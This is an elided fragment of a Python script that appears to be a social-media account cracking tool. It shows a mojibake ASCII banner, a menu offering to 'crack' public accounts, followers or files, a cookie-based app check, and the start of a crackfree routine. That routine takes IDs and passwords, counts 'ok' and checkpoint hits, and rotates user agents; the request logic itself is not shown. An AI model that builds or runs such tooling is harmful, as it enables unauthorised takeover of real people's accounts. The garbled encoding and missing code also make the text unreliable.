...
def banner():
	clear()
	print(f"""
\033[1;37m	â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—     â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•—
\033[1;37m	â–ˆâ–ˆâ•”â•â•â•â•â•    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘
\033[1;34m	â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘ â–ˆâ•— â–ˆâ–ˆâ•‘ \033[1;39m0.8v
\033[1;34m	â•šâ•â•â•â•â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘
\033[1;31m	â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘    â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•
\033[1;31m	â•šâ•â•â•â•â•â•â•    â•šâ•â•  â•šâ•â•     â•šâ•â•â•â•šâ•â•â•
...
def menu(my_name):
	...
	print("")
	print('			\033[1;31m%sðš‚ð™°ðš† %s\033[1;31m01%s%s \033[1;31mCRACK PUBLIC %s%s%s'%(P,H,P,H,P,H,P))
	print('			\033[1;31m%sðš‚ð™°ðš† %s\033[1;31m02%s%s \033[1;31mCRACK PUBLIC (MULTI) %s%s%s'%(P,H,P,H,P,H,P))	
	print('			\033[1;37m%sðš‚ð™°ðš† %s\033[1;37m03%s%s \033[1;37mCRACK FOLLOWERS %s%s%s'%(P,H,P,H,P,H,P))	
	print('			\033[1;37m%sðš‚ð™°ðš† %s\033[1;37m04%s%s \033[1;37mCRACK FILE %s%s%s'%(P,H,P,H,P,H,P))	
	print('			\033[1;37m%sðš‚ð™°ðš† %s\033[1;34m05%s%s \033[1;34mMY TELEGRAM %s%s%s'%(P,H,P,H,P,H,P))	
	print('			\033[1;34m%sðš‚ð™°ðš† %s\033[1;34m00%s%s \033[1;34mEXIT %s%s%s'%(P,H,P,H,P,H,P))
	print("")
...
def cek_apk(session,kuki):
    ...
    if len(game)==0:
        ...
        print(f'\r   {P} [{H}Â®{P}] %s OK Your Active Apps OK     :{B}       '%(H))
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[SAW] {P} {asu}Mbasic{P}{P}{b}{loop}{P}/{p}{len(id)}{P}â€”{P}[{H}--{ok} : {P}]â€”{P}[{k} : {cp}-{x}]â€”{m}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
